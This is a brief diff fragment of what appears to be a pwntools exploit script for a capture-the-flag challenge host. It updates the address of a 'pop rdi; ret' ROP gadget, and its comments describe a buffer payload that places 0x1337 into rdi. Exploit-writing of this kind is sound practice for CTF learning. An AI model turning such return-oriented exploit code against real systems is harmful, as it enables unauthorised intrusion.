@@ -7,7 +7,7 @@ io = remote("pwn.tokle.dev", 1340)
 io.recvuntil(b"[Quit]")
 
 # Address of "pop_rdi; ret;" gadget
-pop_rdi = 0x403525
+pop_rdi = 0x4038db
 
 # Choose "Fill buffer" option,
 # and send payload which puts 0x1337 into rdi
